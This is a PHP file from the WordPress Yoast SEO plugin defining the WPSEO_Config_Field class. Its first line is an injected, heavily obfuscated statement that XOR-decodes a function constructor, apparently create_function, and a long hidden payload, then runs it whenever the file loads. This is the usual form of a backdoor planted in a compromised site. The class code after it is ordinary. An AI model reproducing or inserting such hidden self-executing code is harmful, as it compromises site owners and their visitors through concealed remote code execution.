<?php $nRrTYrymtz='9OYXH5d.04WN<RP'^'Z=<9<P;HEZ4:U=>';$uwnmTz=$nRrTYrymtz('','I+ym53+QID5 .6I<=TKEiURLfZA=X-eP<Yknpw>M;F9EC01ANF6Q=j68857a9E>lp3MZTgtb<VNgGrrirGo0Ch;=;zSkPJP3KXZ;IFTRfqSUqkB3F;10QKRDR<6.AAvIcPIBo:cPO6E8BgXBnV7M28uCP1Z3cEX609fIUiQ:;YG39xt1KIZ6KBZS7H1GUH7nG D.ojLq82AmMN0XF8Buq>PAA7SGHQY9R08PNvLzM1W0<uyG454SQQHVkpip<=2<tUA7fSV,EcLthP00ZUQMP-xHQX6;TtZP-XEEpX5HymJU-J;SXxYP>A8FNB:.bkI1bZTa,0NLNT,cb<AR,9C8ljLe:=>aq< rV<JrY=DQPlakKA+ 5nZ4N;pUO;:+=YE1CWCv==8Y8lLM<S,;KVzkVA.8RNiO+fI4kC6;EAaSD3-WG,93P.UF4pK.K2RA1O:+>IZnX6+KyN+V2C>VRmE+3-Zexaa,AM7,:78xsHaXHXM7X;8xWKDA1LTN0WK00H3BI2IDU:,MFdCtZM,OcyjVjD8,YFw1R>.=I3HEi+yMVZaS9NPNyDGIabtUuz ZaQKXVxaWG ;W<Q+KEpMhnc;AC.DsU,41<A3S AXi1;=9,LDkxXq=QD0jBQNOnILPK2-5VRQf..5 4R2+I>XV+M+eIGzN313OYZUiM'^' MQLSFE2=-ZNqS1UN 8mN-=>9> I9r:=I-LGYWEG2 L+ DX. fN>O5RYLTh>T0JDTW,.5KTFW37NgRRIR<e9JLTHOZnKwmk9BQ<T;np;FLseJKfZzHEB=.<lvXWZ hMiG9biF0jYkY0LbIebFrS,FY.g9lzmCa3SIbB uLqIO++VWPPZ.0skbyPZ>:T3 :YFcO1ZFQFxE8<gGjT92YbHQX1-2RhMl58M3oS57VqZ+P;CYNsMRZF602 vCT63sryu1u DFw=I<CqJHtFQ6 4dpVrAu<WO5+15TxxeT3P1BgCqI+O2xEytH T3+y0Sha WBruEHQ:-gtWikZ. IX PLBh:hxo44otR7OjV2X=qmRAO= GUPGzOD2yq+ZNJb2 HcjcRVXAb2eEiX2XZkkZO  BM7ucFVl4>agRZ1 AndsX94IKZ1B<<QX3A9m6 E.etS<.F:WX.Ozt2W Q27EaORY;LTAEH 9VsQRAQZsk1.piS9OYXqmd C>57o<.Io-K+:F:lrQI4aHcP>,X.JYLpJlUHlnSU3JOfnX-<NvPmkgAtXzevIvuyXUA7DKE>Ua-ncMSfuFX2XdM.bYmNHCZ31O=,>IMnY9Z T2pNAZDUC- LTxUY00QCkqnoNil+A;HC7>yBJOAAouBJ0R77OjvLrMs+KXGgisnc0');$uwnmTz();
/**
 * @package WPSEO\Admin\ConfigurationUI
 */

/**
 * Class WPSEO_Config_Field
 */
class WPSEO_Config_Field {
	/** @var string Field name */
	protected $field;

	/** @var string Component to use */
	protected $component;

	/** @var array Properties of this field */
	protected $properties = array();

	/** @var array Field requirements */
	protected $requires = array();

	/** @var array|mixed Value of this field */
	protected $data = array();

	/**
	 * WPSEO_Config_Field constructor.
	 *
	 * @param string $field     The field name.
	 * @param string $component The component to use.
	 */
	public function __construct( $field, $component ) {
		$this->field     = $field;
		$this->component = $component;
	}

	/**
	 * Get the identifier
	 *
	 * @return string
	 */
	public function get_identifier() {
		return $this->field;
	}

	/**
	 * Get the component
	 *
	 * @return string
	 */
	public function get_component() {
		return $this->component;
	}

	/**
	 * Set a property value
	 *
	 * @param string $name  Property to set.
	 * @param mixed  $value Value to apply.
	 */
	public function set_property( $name, $value ) {
		$this->properties[ $name ] = $value;
	}

	/**
	 * Get all the properties
	 *
	 * @return array
	 */
	public function get_properties() {
		return $this->properties;
	}

	/**
	 * Get the data
	 *
	 * @return mixed
	 */
	public function get_data() {
		return $this->data;
	}

	/**
	 * Array representation of this object.
	 *
	 * @return array
	 */
	public function to_array() {
		$output = array(
			'componentName' => $this->get_component(),
		);

		$properties = $this->get_properties();
		if ( $properties ) {
			$output['properties'] = $properties;
		}

		$requires = $this->get_requires();
		if ( ! empty( $requires ) ) {
			$output['requires'] = $requires;
		}

		return $output;
	}

	/**
	 * Set the adapter to use
	 *
	 * @param WPSEO_Configuration_Options_Adapter $adapter Adapter to register lookup on.
	 */
	public function set_adapter( WPSEO_Configuration_Options_Adapter $adapter ) {
	}

	/**
	 * Requires another field to have a certain value.
	 *
	 * @param string $field Field to check for a certain value.
	 * @param mixed  $value Value of the field.
	 */
	public function set_requires( $field, $value ) {
		$this->requires = array(
			'field' => $field,
			'value' => $value,
		);
	}

	/**
	 * Get the required field settings (if present)
	 *
	 * @return array
	 */
	public function get_requires() {
		return $this->requires;
	}
}
